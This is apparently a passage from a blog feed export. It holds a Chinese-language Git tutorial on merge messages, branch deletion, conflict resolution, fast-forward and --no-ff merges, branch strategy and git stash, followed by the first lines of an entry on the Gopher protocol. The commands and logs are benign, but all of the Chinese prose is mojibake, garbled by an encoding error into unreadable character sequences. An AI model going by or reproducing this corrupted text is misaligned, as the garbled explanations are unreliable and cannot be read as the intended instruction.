<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Merge branch 'interface'</span><br><span class="line"><span class="meta">#</span><span class="bash"> Please enter a commit message to explain why this merge is necessary,</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> especially <span class="keyword">if</span> it merges an updated upstream into a topic branch.</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Lines starting with <span class="string">'#'</span> will be ignored, and an empty message aborts</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> the commit.</span></span><br></pre></td></tr></table></figure>

<p>æ„æ€æ˜¯è¯´å¸Œæœ›æˆ‘ä»¬èƒ½å¤Ÿç»™å‡ºåˆç†çš„è§£é‡Šï¼Œä¸ºä»€ä¹ˆè¦åˆå¹¶è¿™ä¸¤ä¸ªåˆ†æ”¯ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å…³é—­ï¼ˆ æŒ‰é”®ç›˜å·¦ä¸Šè§’<code>Esc</code>ï¼Œè¾“å…¥<code>:wq</code>å³å¯é€€å‡ºï¼‰ä¹Ÿå¯ä»¥å†™å…¥ä¸€äº›ä¿¡æ¯ï¼ˆ æŒ‰é”®ç›˜å­—æ¯ <code>i</code> è¿›å…¥<code>insert</code>æ¨¡å¼å¹¶è¾“å…¥è¯´æ˜ç„¶åå…³é—­ ï¼‰</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">merge front and interface</span><br></pre></td></tr></table></figure>

<p>ç„¶åæˆ‘ä»¬çš„å½“å‰ä¸»åˆ†æ”¯ä¸‹å°±ä¼šå‡ºç°<code>front.txt</code>å’Œ<code>interface.txt</code>ä¸¤ä¸ªæ–‡ä»¶äº†ã€‚</p>
<h3 id="åˆ é™¤åˆ†æ”¯"><a href="#åˆ é™¤åˆ†æ”¯" class="headerlink" title="åˆ é™¤åˆ†æ”¯"></a>åˆ é™¤åˆ†æ”¯</h3><p>æˆ‘ä»¬åˆå¹¶å¥½åˆ†æ”¯åï¼Œå¯¹äºä¸éœ€è¦çš„åˆ†æ”¯å¯ä»¥åˆ é™¤ï¼Œä¸ä¼šå¯¹æˆ‘ä»¬ç›®å‰çš„åˆ†æ”¯äº§ç”Ÿå½±å“ï¼Œå› ä¸ºæˆ‘ä»¬å½“å‰çš„ä¸»åˆ†æ”¯æ¯”ä¸¤ä¸ªåˆ†æ”¯éƒ½â€œæå‰â€ï¼Œ<strong>åˆ é™¤å®é™…ä¸Šåˆ é™¤çš„æ˜¯æŒ‡é’ˆ</strong>ã€‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git branch -d front</span></span><br><span class="line">Deleted branch front (was 0c93a6f).</span><br><span class="line"><span class="meta">$</span><span class="bash"> git branch -d interface</span></span><br><span class="line">Deleted branch interface (was 824a607).</span><br><span class="line"><span class="meta">$</span><span class="bash"> git branch</span></span><br><span class="line">* master</span><br><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">log</span></span></span><br><span class="line">commit 844e6a7ef9d46e3386bb0e18fecef93121f1831c (HEAD -&gt; master)</span><br><span class="line">Merge: 0c93a6f 824a607</span><br><span class="line">Author: YaleXin &lt;495592364@qq.com&gt;</span><br><span class="line">Date:   Wed Feb 9 15:03:51 2022 +0800</span><br><span class="line"></span><br><span class="line">    merge front and interface</span><br><span class="line"></span><br><span class="line">commit 824a60792b798f2ae9dfb55859142c41773573ad</span><br><span class="line">Author: YaleXin &lt;495592364@qq.com&gt;</span><br><span class="line">Date:   Wed Feb 9 14:45:35 2022 +0800</span><br><span class="line"></span><br><span class="line">    new interface branch</span><br><span class="line"></span><br><span class="line">commit 0c93a6f1f8ca2c884040437b3568514518ffbb7a</span><br><span class="line">Author: YaleXin &lt;495592364@qq.com&gt;</span><br><span class="line">Date:   Wed Feb 9 14:37:57 2022 +0800</span><br><span class="line"></span><br><span class="line">    new front branch</span><br><span class="line">:</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥å‘ç°æˆ‘ä»¬çš„æäº¤éƒ½æ²¡æœ‰ä¸¢å¤±</p>
<h3 id="è§£å†³å†²çª"><a href="#è§£å†³å†²çª" class="headerlink" title="è§£å†³å†²çª"></a>è§£å†³å†²çª</h3><p>å½“ç„¶äº†åˆå¹¶ä¹Ÿä¸æ˜¯æ¯ä¸€æ¬¡éƒ½èƒ½æ„‰å¿«åœ°è¿›è¡Œï¼Œä¸ç„¶å‰åç«¯ä¹‹é—´çš„çŸ›ç›¾ä¹Ÿä¸ä¼šæœ‰è¿™ä¹ˆå¤šäº†ã€‚</p>
<p>å‡å¦‚å‰ç«¯è¯´<code>JavaScript</code>æ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€ï¼</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git switch -c front</span></span><br><span class="line">Switched to a new branch 'front'</span><br></pre></td></tr></table></figure>

<p>æ–°å»º<code>lan.txt</code>æ–‡ä»¶å¹¶åœ¨æ–‡ä»¶ä¸­è¾“å…¥</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">`JavaScript`æ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€ï¼</span><br></pre></td></tr></table></figure>

<p>ç„¶åæäº¤</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git add .</span></span><br><span class="line">warning: LF will be replaced by CRLF in lan.txt.</span><br><span class="line">The file will have its original line endings in your working directory</span><br><span class="line"><span class="meta">$</span><span class="bash"> git commit -m <span class="string">"æœ€å¥½çš„è¯­è¨€"</span></span></span><br><span class="line">[front 2ba9fe4] æœ€å¥½çš„è¯­è¨€</span><br><span class="line"> 1 file changed, 1 insertion(+)</span><br><span class="line"> create mode 100644 lan.txt</span><br></pre></td></tr></table></figure>

<p>è€Œåç«¯çš„äººå´è¯´<code>Java</code>æ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€ï¼</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git switch master</span></span><br><span class="line">Switched to branch 'master'</span><br></pre></td></tr></table></figure>

<p>æ–°å»º<code>lan.txt</code>æ–‡ä»¶å¹¶åœ¨æ–‡ä»¶ä¸­è¾“å…¥</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">`Java`æ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€ï¼</span><br></pre></td></tr></table></figure>

<p>ç„¶åæäº¤</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git add .</span></span><br><span class="line">warning: LF will be replaced by CRLF in lan.txt.</span><br><span class="line">The file will have its original line endings in your working directory</span><br><span class="line"><span class="meta">$</span><span class="bash"> git commit -m <span class="string">"æœ€å¥½çš„è¯­è¨€"</span></span></span><br><span class="line">[master 8ee9862] æœ€å¥½çš„è¯­è¨€</span><br><span class="line"> 1 file changed, 1 insertion(+)</span><br><span class="line"> create mode 100644 lan.txt</span><br></pre></td></tr></table></figure>

<p>ç„¶åå°è¯•åˆå¹¶</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git merge front</span></span><br><span class="line">Auto-merging lan.txt</span><br><span class="line">CONFLICT (add/add): Merge conflict in lan.txt</span><br><span class="line">Automatic merge failed; fix conflicts and then commit the result.</span><br></pre></td></tr></table></figure>

<p>è¿™å¯æŠŠ<code>Git</code>éš¾ä½äº†ï¼Œä¸åŒçš„åˆ†æ”¯å¯¹åŒä¸€æ–‡ä»¶æœ‰ä¸åŒçš„ä¿®æ”¹æ–¹å¼ï¼Œ<code>Git</code>å°½æœ€å¤§èƒ½åŠ›ä¹Ÿæ— æ³•å°†å…¶åˆå¹¶ï¼Œç°åœ¨åªèƒ½æˆ‘ä»¬è‡ªå·±æ‰‹åŠ¨åˆå¹¶å†²çªäº†ã€‚</p>
<p>æˆ‘ä»¬æ‰“å¼€<code>lan.txt</code>æ–‡ä»¶å¯ä»¥å‘ç°</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat lan.txt</span></span><br><span class="line">&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD</span><br><span class="line">`Java`æ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€ï¼</span><br><span class="line">=======</span><br><span class="line">`JavaScript`æ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€ï¼</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;&gt;&gt;&gt;&gt; front</span></span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢è¡¨æ˜<code>&lt;&lt;&lt;&lt;&lt;&lt;&lt;</code>å’Œ<code>=======</code>ä¹‹é—´çš„æ˜¯å½“å‰åˆ†æ”¯çš„å†…å®¹ï¼Œ<code>=======</code>å’Œ<code>&gt;&gt;&gt;&gt;&gt;&gt;&gt;</code>ä¹‹é—´çš„æ˜¯<code>front</code>åˆ†æ”¯çš„å†…å®¹ï¼Œæˆ‘ä»¬æ‰‹åŠ¨å°†å…¶æ”¹æˆ</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">è‡ªç„¶è¯­è¨€æ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€ï¼</span><br></pre></td></tr></table></figure>

<p>ç„¶åæäº¤</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git add .</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git commit -m <span class="string">"ä½ ä»¬ä¿©åˆ«åµäº†"</span></span></span><br><span class="line">[master 7cec3a6] ä½ ä»¬ä¿©åˆ«åµäº†</span><br><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">log</span></span></span><br><span class="line">commit 7cec3a623357cbea756a12235a995df2f85d6eed (HEAD -&gt; master)</span><br><span class="line">Merge: 8ee9862 2ba9fe4</span><br><span class="line">Author: YaleXin &lt;495592364@qq.com&gt;</span><br><span class="line">Date:   Wed Feb 9 16:06:57 2022 +0800</span><br><span class="line"></span><br><span class="line">    ä½ ä»¬ä¿©åˆ«åµäº†</span><br><span class="line"></span><br><span class="line">commit 8ee98627480b081d1885f8adcb7aad9580c2910c</span><br><span class="line">Author: YaleXin &lt;495592364@qq.com&gt;</span><br><span class="line">Date:   Wed Feb 9 15:55:50 2022 +0800</span><br><span class="line"></span><br><span class="line">    æœ€å¥½çš„è¯­è¨€</span><br><span class="line"></span><br><span class="line">commit 2ba9fe41d1379e4d57077f6d76ba7ed7e4ec55cd (front)</span><br><span class="line">Author: YaleXin &lt;495592364@qq.com&gt;</span><br><span class="line">Date:   Wed Feb 9 15:51:01 2022 +0800</span><br><span class="line"></span><br><span class="line">    æœ€å¥½çš„è¯­è¨€</span><br></pre></td></tr></table></figure>

<h2 id="åˆ†æ”¯ç®¡ç†ç­–ç•¥"><a href="#åˆ†æ”¯ç®¡ç†ç­–ç•¥" class="headerlink" title="åˆ†æ”¯ç®¡ç†ç­–ç•¥"></a>åˆ†æ”¯ç®¡ç†ç­–ç•¥</h2><h3 id="å¼€å‘åˆ†æ”¯"><a href="#å¼€å‘åˆ†æ”¯" class="headerlink" title="å¼€å‘åˆ†æ”¯"></a>å¼€å‘åˆ†æ”¯</h3><p> é€šå¸¸ï¼Œåˆå¹¶åˆ†æ”¯æ—¶ï¼Œå¦‚æœæ²¡æœ‰å†²çªï¼Œå¹¶ä¸”åˆ†æ”¯æ˜¯å•å‘ä¸€æ¡çº¿è·¯ç»§æ‰¿ä¸‹æ¥çš„ï¼Œgitä¼šä½¿ç”¨ <code>fast forword</code>æ¨¡å¼ï¼Œä½†æ˜¯æœ‰äº›å¿«é€Ÿåˆå¹¶ä¸èƒ½æˆåŠŸï¼Œä½†æ˜¯åˆæ²¡æœ‰å†²çªæ—¶ï¼Œå°±ä¼šè§¦å‘åˆ†æ”¯ç®¡ç†ç­–ç•¥ï¼Œ<code>Git</code>ä¼šè‡ªåŠ¨åšä¸€æ¬¡æ–°çš„æäº¤ã€‚ </p>
<p>å½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥æ‰‹åŠ¨å¼ºåˆ¶ç¦ç”¨<code>Fast forward</code>æ¨¡å¼ï¼Œ<code>Git</code>å°±ä¼šåœ¨<code>merge</code>æ—¶ç”Ÿæˆä¸€ä¸ªæ–°çš„<code>commit</code>.</p>
<p>æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹åŒºåˆ«ï¼š</p>
<p>é¦–å…ˆæ–°å»ºä¸€ä¸ªåˆ†æ”¯å¹¶ä¿®æ”¹<code>lan.txt</code>ï¼Œç„¶åä½¿ç”¨<strong>é»˜è®¤æ–¹å¼</strong>åˆå¹¶</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git switch -c default</span></span><br><span class="line">Switched to a new branch 'default'</span><br><span class="line">ä¿®æ”¹lan.txtæ–‡ä»¶</span><br><span class="line"><span class="meta">$</span><span class="bash"> git add .</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git commit -m <span class="string">"default commit"</span></span></span><br><span class="line">[default e167bc0] default commit</span><br><span class="line"> 1 file changed, 1 insertion(+), 1 deletion(-)</span><br><span class="line"><span class="meta">$</span><span class="bash"> git switch master</span></span><br><span class="line">Switched to branch 'master'</span><br><span class="line"><span class="meta">$</span><span class="bash"> git merge default</span></span><br><span class="line">Updating 7cec3a6..e167bc0</span><br><span class="line">Fast-forward</span><br><span class="line"> lan.txt | 2 +-</span><br><span class="line"> 1 file changed, 1 insertion(+), 1 deletion(-)</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å†æŸ¥çœ‹æäº¤æƒ…å†µï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">log</span> --pretty=oneline --abbrev-commit --graph</span></span><br><span class="line">* e167bc0 (HEAD -&gt; master, default) default commit</span><br><span class="line">*   7cec3a6 ä½ ä»¬ä¿©åˆ«åµäº†</span><br><span class="line">|\</span><br><span class="line">| * 2ba9fe4 æœ€å¥½çš„è¯­è¨€</span><br><span class="line">* | 8ee9862 æœ€å¥½çš„è¯­è¨€</span><br><span class="line">|/</span><br><span class="line">*   844e6a7 merge front and interface</span><br><span class="line">|\</span><br><span class="line">| * 824a607 new interface branch</span><br><span class="line">* | 0c93a6f new front branch</span><br><span class="line">|/</span><br><span class="line">* dcfdaa2 3</span><br><span class="line">* e54198e second commit</span><br><span class="line">* bbe2a77 first commit</span><br></pre></td></tr></table></figure>

<p>åˆå¹¶æƒ…å†µå¦‚å›¾æ‰€ç¤º</p>
<p><img src="https://qiniu.yalexin.top/branch.drawio4.png" alt></p>
<p>è®©æˆ‘ä»¬å†æ¥ä¸ªç¦ç”¨<code>Fast forward</code>æ¨¡å¼çš„åˆå¹¶</p>
<p>æ–°å»ºä¸€ä¸ªåˆ†æ”¯å¹¶ä¿®æ”¹<code>lan.txt</code>ï¼Œç„¶åä½¿ç”¨<strong>ç¦ç”¨<code>Fast forward</code>æ¨¡å¼</strong>åˆå¹¶</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git switch -c noFast</span></span><br><span class="line">Switched to a new branch 'noFast'</span><br><span class="line">ä¿®æ”¹lan.txtæ–‡ä»¶</span><br><span class="line"><span class="meta">$</span><span class="bash"> git add .</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git commit -m <span class="string">"noFast commit"</span></span></span><br><span class="line">[noFast f7f1ef6] noFast commit</span><br><span class="line"> 1 file changed, 2 insertions(+), 1 deletion(-)</span><br><span class="line"><span class="meta">$</span><span class="bash"> git switch master</span></span><br><span class="line">Switched to branch 'master'</span><br><span class="line"><span class="meta">$</span><span class="bash"> git merge --no-ff -m <span class="string">"merge by no-ff"</span> noFast</span></span><br><span class="line">Merge made by the 'ort' strategy.</span><br><span class="line"> lan.txt | 3 ++-</span><br><span class="line"> 1 file changed, 2 insertions(+), 1 deletion(-)</span><br><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">log</span> --pretty=oneline --abbrev-commit --graph</span></span><br><span class="line">*   274515d (HEAD -&gt; master) merge by no-ff</span><br><span class="line">|\</span><br><span class="line">| * f7f1ef6 (noFast) noFast commit</span><br><span class="line">|/</span><br><span class="line">* e167bc0 (default) default commit</span><br><span class="line">*   7cec3a6 ä½ ä»¬ä¿©åˆ«åµäº†</span><br><span class="line">|\</span><br><span class="line">| * 2ba9fe4 æœ€å¥½çš„è¯­è¨€</span><br><span class="line">* | 8ee9862 æœ€å¥½çš„è¯­è¨€</span><br><span class="line">|/</span><br><span class="line">*   844e6a7 merge front and interface</span><br><span class="line">|\</span><br><span class="line">| * 824a607 new interface branch</span><br><span class="line">* | 0c93a6f new front branch</span><br><span class="line">|/</span><br><span class="line">* dcfdaa2 3</span><br><span class="line">* e54198e second commit</span><br><span class="line">* bbe2a77 first commit</span><br></pre></td></tr></table></figure>

<p>åˆå¹¶æƒ…å†µå¦‚å›¾æ‰€ç¤º</p>
<p><img src="https://qiniu.yalexin.top/branch.drawio5.png" alt></p>
<p>å³ä¼š<strong>è‡ªåŠ¨æäº¤ä¸€æ¬¡</strong>ã€‚</p>
<p>æœ‰äº†ä¸Šè¿°æ¸…æ™°çš„è®¤è¯†ä»¥åï¼Œæˆ‘ä»¬ä»¥ååœ¨æ—¥å¸¸ä½¿ç”¨<code>Git</code>å¼€å‘çš„æ—¶å€™åº”è¯¥è¦ç§‰æ‰¿åœ¨<code>master</code>å°½é‡å°‘æäº¤çš„ç†å¿µï¼Œå³å°½å¯èƒ½ç¨³å®šï¼Œæœ€å¥½åªç”¨æ¥å‘å¸ƒç‰ˆæœ¬ï¼Œç„¶ååœ¨åˆ†æ”¯<code>dev</code>ä¸Šè¿›è¡Œæ—¥å¸¸å¼€å‘ï¼Œæ¯é€¢å¤§ç‰ˆæœ¬æ›´æ–°çš„æ—¶å€™å†æŠŠå®ƒåˆå¹¶åˆ°ä¸»åˆ†æ”¯ä¸Šé¢ï¼›å½“ç„¶äº†ï¼Œåœ¨åˆ†å·¥æ˜ç¡®çš„å‰æä¸‹ï¼Œæ¯ä¸ªäººåº”è¯¥è‡³å°‘æœ‰å±äºè‡ªå·±çš„åˆ†æ”¯ï¼Œç„¶åå®šæœŸåˆå¹¶åˆ°<code>dev</code>ã€‚</p>
<h3 id="ä¸´æ—¶åˆ†æ”¯"><a href="#ä¸´æ—¶åˆ†æ”¯" class="headerlink" title="ä¸´æ—¶åˆ†æ”¯"></a>ä¸´æ—¶åˆ†æ”¯</h3><p>å‰é¢è®²åˆ°ç‰ˆæœ¬åº“çš„ä¸¤æ¡ä¸»è¦åˆ†æ”¯ï¼š<code>master</code>å’Œ<code>dev</code>ã€‚å‰è€…ç”¨äºæ­£å¼å‘å¸ƒï¼Œåè€…ç”¨äºæ—¥å¸¸å¼€å‘ã€‚å…¶å®ï¼Œå¸¸è®¾åˆ†æ”¯åªéœ€è¦è¿™ä¸¤æ¡å°±å¤Ÿäº†ï¼Œä¸éœ€è¦å…¶ä»–äº†ã€‚</p>
<p>ä½†æ˜¯ï¼Œé™¤äº†å¸¸è®¾åˆ†æ”¯ä»¥å¤–ï¼Œè¿˜æœ‰ä¸€äº›ä¸´æ—¶æ€§åˆ†æ”¯ï¼Œç”¨äºåº”å¯¹ä¸€äº›ç‰¹å®šç›®çš„çš„ç‰ˆæœ¬å¼€å‘ã€‚ä¸´æ—¶æ€§åˆ†æ”¯ä¸»è¦æœ‰ä¸‰ç§ï¼š</p>
<ul>
<li>åŠŸèƒ½ï¼ˆ<code>feature</code>ï¼‰åˆ†æ”¯</li>
<li>é¢„å‘å¸ƒï¼ˆ<code>release</code>ï¼‰åˆ†æ”¯</li>
<li>ä¿®è¡¥bugï¼ˆ<code>fixbug</code>ï¼‰åˆ†æ”¯</li>
</ul>
<p>è¿™ä¸‰ç§åˆ†æ”¯éƒ½å±äºä¸´æ—¶æ€§éœ€è¦ï¼Œä½¿ç”¨å®Œä»¥åï¼Œåº”è¯¥åˆ é™¤ï¼Œä½¿å¾—ä»£ç åº“çš„å¸¸è®¾åˆ†æ”¯å§‹ç»ˆåªæœ‰<code>master</code>å’Œ<code>dev</code>ã€‚</p>
<h4 id="åŠŸèƒ½åˆ†æ”¯"><a href="#åŠŸèƒ½åˆ†æ”¯" class="headerlink" title="åŠŸèƒ½åˆ†æ”¯"></a>åŠŸèƒ½åˆ†æ”¯</h4><p> å®ƒæ˜¯ä¸ºäº†å¼€å‘æŸç§ç‰¹å®šåŠŸèƒ½ï¼Œä»<code>dev</code>åˆ†æ”¯ä¸Šé¢åˆ†å‡ºæ¥çš„ï¼Œå¼€å‘å®Œæˆåï¼Œè¦å†å¹¶å…¥<code>dev</code>ï¼Œ åŠŸèƒ½åˆ†æ”¯çš„åå­—ï¼Œå¯ä»¥é‡‡ç”¨<code>feature-name</code>çš„å½¢å¼å‘½åã€‚ </p>
<h4 id="é¢„å‘å¸ƒåˆ†æ”¯"><a href="#é¢„å‘å¸ƒåˆ†æ”¯" class="headerlink" title="é¢„å‘å¸ƒåˆ†æ”¯"></a>é¢„å‘å¸ƒåˆ†æ”¯</h4><p>é¢„å‘å¸ƒåˆ†æ”¯ï¼Œå®ƒæ˜¯æŒ‡å‘å¸ƒæ­£å¼ç‰ˆæœ¬ä¹‹å‰ï¼ˆå³åˆå¹¶åˆ°<code>master</code>åˆ†æ”¯ä¹‹å‰ï¼‰ï¼Œæˆ‘ä»¬å¯èƒ½éœ€è¦æœ‰ä¸€ä¸ªé¢„å‘å¸ƒçš„ç‰ˆæœ¬è¿›è¡Œæµ‹è¯•ã€‚é¢„å‘å¸ƒåˆ†æ”¯æ˜¯ä»<code>dev</code>åˆ†æ”¯ä¸Šé¢åˆ†å‡ºæ¥çš„ï¼Œé¢„å‘å¸ƒç»“æŸä»¥åï¼Œå¿…é¡»åˆå¹¶è¿›<code>dev</code>å’Œ<code>master</code>åˆ†æ”¯ã€‚å®ƒçš„å‘½åï¼Œå¯ä»¥é‡‡ç”¨<code>release-*</code>çš„å½¢å¼ã€‚</p>
<h4 id="ä¿®è¡¥åˆ†æ”¯"><a href="#ä¿®è¡¥åˆ†æ”¯" class="headerlink" title="ä¿®è¡¥åˆ†æ”¯"></a>ä¿®è¡¥åˆ†æ”¯</h4><p>è½¯ä»¶æ­£å¼å‘å¸ƒä»¥åï¼Œéš¾å…ä¼šå‡ºç°<code>bug</code>ã€‚è¿™æ—¶å°±éœ€è¦åˆ›å»ºä¸€ä¸ªåˆ†æ”¯ï¼Œè¿›è¡Œ<code>bug</code>ä¿®è¡¥ã€‚</p>
<p>ä¿®è¡¥<code>bug</code>åˆ†æ”¯æ˜¯ä»<code>master</code>åˆ†æ”¯ä¸Šé¢åˆ†å‡ºæ¥çš„ã€‚ä¿®è¡¥ç»“æŸä»¥åï¼Œå†åˆå¹¶è¿›<code>master</code>å’Œ<code>deev</code>åˆ†æ”¯ã€‚å®ƒçš„å‘½åï¼Œå¯ä»¥é‡‡ç”¨<code>fixbug-*</code>çš„å½¢å¼ã€‚</p>
<p>è¿™é‡Œæœ‰ä¸€ä¸ªåœºæ™¯ï¼Œä½ æ‰‹å¤´ä¸Šçš„å·¥ä½œè¿˜æ²¡åšå®Œï¼Œä½†æ˜¯ä½ æ¥åˆ°ä¸€ä¸ªæ¯”è¾ƒç´§æ€¥çš„ä¿®å¤ä»»åŠ¡çš„æ—¶å€™ï¼Œä½ åˆä¸æƒ³æš‚æ—¶æäº¤è¿™åŠæˆªå­ä»£ç ï¼Œè¯¥æ€ä¹ˆåŠï¼Ÿ</p>
<p><code>Git</code>æä¾›äº†<code>stash</code>å‘½ä»¤ï¼Œå®ƒæŠŠæ‰€æœ‰æœªæäº¤çš„ä¿®æ”¹ï¼ˆåŒ…æ‹¬æš‚å­˜çš„å’Œéæš‚å­˜çš„ï¼‰éƒ½ä¿å­˜èµ·æ¥ï¼Œç”¨äºåç»­æ¢å¤å½“å‰å·¥ä½œç›®å½•ã€‚ </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git status</span></span><br><span class="line">On branch dev</span><br><span class="line">Changes not staged for commit:</span><br><span class="line">  (use "git add &lt;file&gt;..." to update what will be committed)</span><br><span class="line">  (use "git restore &lt;file&gt;..." to discard changes in working directory)</span><br><span class="line">        modified:   front.txt</span><br><span class="line"></span><br><span class="line">no changes added to commit (use "git add" and/or "git commit -a")</span><br><span class="line"><span class="meta">$</span><span class="bash"> git stash</span></span><br><span class="line">Saved working directory and index state WIP on dev: 274515d merge by no-ff</span><br><span class="line"><span class="meta">$</span><span class="bash"> git status</span></span><br><span class="line">On branch dev</span><br><span class="line">nothing to commit, working tree clean</span><br></pre></td></tr></table></figure>

<p>ç­‰æˆ‘ä»¬åœ¨æ–°çš„åˆ†æ”¯ä¸Šä¿®å¤å¥½<code>BUG</code>ï¼Œå¹¶åˆå¹¶å¥½åˆ†æ”¯ï¼Œç„¶åå†å°†è¿™ä¸ªæš‚æ—¶çš„ä¿®å¤åˆ†æ”¯åˆ é™¤åï¼Œå°±å¯ä»¥åˆ‡æ¢åˆ°æˆ‘ä»¬çš„<code>dev</code>åˆ†æ”¯ä¸Šæ¥ç»§ç»­æˆ‘ä»¬çš„å·¥ä½œäº†ã€‚</p>
<p>å¯ä»¥çœ‹ä¸€ä¸‹ä¹‹å‰æš‚å­˜çš„ä»£ç </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git stash list</span></span><br><span class="line">stash@&#123;0&#125;: WIP on dev: 274515d merge by no-ff</span><br><span class="line"><span class="meta">$</span><span class="bash"> git status</span></span><br><span class="line">On branch dev</span><br><span class="line">nothing to commit, working tree clean</span><br></pre></td></tr></table></figure>

<p>å›å¤æˆ‘ä»¬çš„å·¥ä½œæœ‰ä¸¤ç§æ–¹æ³•ï¼š</p>
<ul>
<li>ç”¨<code>git stash apply</code>æ¢å¤ï¼Œä½†æ˜¯æ¢å¤åï¼Œ<code>stash</code>ä¸­çš„å†…å®¹å¹¶ä¸åˆ é™¤ï¼Œä½ éœ€è¦ç”¨<code>git stash drop</code>æ¥åˆ é™¤ </li>
<li>ç”¨<code>git stash pop</code>ï¼Œè¯¥æ–¹æ³•åœ¨æ¢å¤çš„åŒæ—¶æŠŠ<code>stash</code>ä¸­çš„å†…å®¹ä¹Ÿåˆ äº†ï¼š </li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git stash pop</span></span><br><span class="line">On branch dev</span><br><span class="line">Changes not staged for commit:</span><br><span class="line">  (use "git add &lt;file&gt;..." to update what will be committed)</span><br><span class="line">  (use "git restore &lt;file&gt;..." to discard changes in working directory)</span><br><span class="line">        modified:   front.txt</span><br><span class="line"></span><br><span class="line">no changes added to commit (use "git add" and/or "git commit -a")</span><br><span class="line">Dropped refs/stash@&#123;0&#125; (414125ba81aaed29ef4736209c257077fb277202)</span><br></pre></td></tr></table></figure>

<p>ç„¶åæˆ‘ä»¬å°±å¯ä»¥ç»§ç»­æ„‰å¿«åœ°è¿›è¡Œæˆ‘ä»¬çš„å·¥ä½œäº†ã€‚</p>
]]></content>
      <categories>
        <category>ç¬”è®°</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>å­¦ä¹ </tag>
        <tag>å‘½ä»¤è¡Œ</tag>
      </tags>
  </entry>
  <entry>
    <title>Gopheråè®®</title>
    <url>/2022/06/29/Gopher%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><blockquote>
<p>Gopheræ˜¯Internetä¸Šä¸€ä¸ªéå¸¸æœ‰åçš„ä¿¡æ¯æŸ¥æ‰¾ç³»ç»Ÿï¼Œå®ƒå°†Internetä¸Šçš„æ–‡ä»¶ç»„ç»‡æˆæŸç§ç´¢å¼•ï¼Œå¾ˆæ–¹ä¾¿åœ°å°†ç”¨æˆ·ä»Internetçš„ä¸€å¤„å¸¦åˆ°å¦ä¸€å¤„ã€‚åœ¨WWWå‡ºç°ä¹‹å‰ï¼ŒGopheræ˜¯Internetä¸Šæœ€ä¸»è¦çš„ä¿¡æ¯æ£€ç´¢å·¥å…·ï¼ŒGopherç«™ç‚¹ä¹Ÿæ˜¯æœ€ä¸»è¦çš„ç«™ç‚¹ï¼Œä½¿ç”¨tcp70ç«¯å£ã€‚ä½†åœ¨WWWå‡ºç°åï¼ŒGopherå¤±å»äº†æ˜”æ—¥çš„è¾‰ç…Œã€‚ç°åœ¨å®ƒåŸºæœ¬è¿‡æ—¶ï¼Œäººä»¬å¾ˆå°‘å†ä½¿ç”¨å®ƒï¼›</p>
</blockquote>
<a id="more"></a>

